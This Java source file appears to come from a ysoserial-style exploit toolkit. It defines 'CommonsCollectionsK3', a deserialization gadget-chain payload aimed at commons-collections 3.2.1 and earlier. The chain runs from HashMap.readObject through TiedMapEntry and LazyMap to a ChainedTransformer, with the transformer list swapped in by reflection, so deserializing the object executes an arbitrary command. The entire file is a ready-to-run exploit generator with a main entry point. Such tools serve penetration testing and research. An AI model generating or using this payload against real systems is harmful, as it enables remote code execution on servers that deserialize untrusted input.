package cn.butler.yso.payloads;

import cn.butler.payloads.ObjectPayload;
import cn.butler.yso.payloads.custom.CommonsCollectionsUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import cn.butler.payloads.annotation.Authors;
import cn.butler.payloads.annotation.Dependencies;
import cn.butler.payloads.PayloadRunner;
import cn.butler.yso.payloads.util.Reflections;

import java.util.HashMap;
import java.util.Map;

/*
Gadget chain:
    java.util.HashMap.readObject()
        java.util.HashMap.hash()
            TiedMapEntry.hashCode()
                TiedMapEntry.getValue()
                LazyMap.get()
                    ChainedTransformer.transform()
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:<=3.2.1"})
@Authors({Authors.KORLR})
public class CommonsCollectionsK3 extends PayloadRunner implements ObjectPayload<Map> {

    public Map getObject(final String command) throws Exception {
        final Transformer[] transformers = CommonsCollectionsUtil.getTransformerList(command);

        ChainedTransformer inertChain = new ChainedTransformer(new Transformer[]{});

        HashMap<String, String> innerMap = new HashMap<String, String>();
        Map m = LazyMap.decorate(innerMap, inertChain);

        Map outerMap = new HashMap();
        TiedMapEntry tied = new TiedMapEntry(m, "v");
        outerMap.put(tied, "t");
        innerMap.clear();

        Reflections.setFieldValue(inertChain, "iTransformers", transformers);
        return outerMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollectionsK3.class, args);
    }
}
